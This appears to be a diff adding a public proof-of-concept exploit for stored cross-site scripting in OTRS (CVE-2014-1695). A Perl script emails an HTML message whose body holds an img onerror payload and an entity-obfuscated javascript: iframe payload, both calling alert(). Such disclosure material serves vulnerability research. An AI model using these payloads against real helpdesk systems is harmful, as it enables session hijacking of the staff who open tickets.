@@ -1,0 +1,20 @@
+# Exploit Title: Stored Cross-Site Scripting (XSS) in OTRS
+# Date: 28.01.2014
+# Exploit Author: Adam Ziaja http://adamziaja.com
+# Vendor Homepage: https://www.otrs.com
+# Version: 3.1.x before 3.1.20, 3.2.x before 3.2.15, and 3.3.x before 3.3.5
+# CVE : CVE-2014-1695
+
+#!/usr/bin/perl -w
+use strict;
+use MIME::Lite;
+my $msg = MIME::Lite->new(
+    Subject => 'OTRS XSS PoC',
+    From => 'attacker@example.com',
+    To => 'otrs@example.com',
+    Type => 'text/html',
+    Data =>
+        '<html><body><img/onerror="alert(\'XSS1\')"src=a><iframe
+src=javasc&#x72ipt:alert(\'XSS2\') ></body></html>'
+);
+$msg->send();
